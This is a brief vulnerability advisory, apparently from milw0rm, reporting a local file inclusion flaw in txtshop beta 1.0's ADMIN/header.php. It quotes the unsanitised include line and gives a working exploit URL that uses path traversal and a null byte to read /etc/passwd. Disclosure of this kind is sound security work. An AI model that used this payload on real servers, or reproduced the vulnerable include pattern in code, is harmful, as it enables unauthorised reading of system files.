@@ -1,0 +1,26 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+txtshop - beta 1.0 / Local File Inclusion Vulnerability
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+$ Program: txtshop
+$ Version: <= 1.0
+$ File affected: ADMIN/header.php
+$ Download: http://sourceforge.net/projects/txtshop/
+
+
+Found by Pepelux <pepelux[at]enye-sec.org>
+eNYe-Sec - www.enye-sec.org
+
+
+--Bug --
+
+4.	if (!$language)$language="ch";
+5.	include_once("../lib/lang.".$language.".php");
+
+
+
+-- Exploit --
+
+http://site.com/ADMIN/header.php?language=/../../../../../etc/passwd%00
+
+# milw0rm.com [2008-10-23]
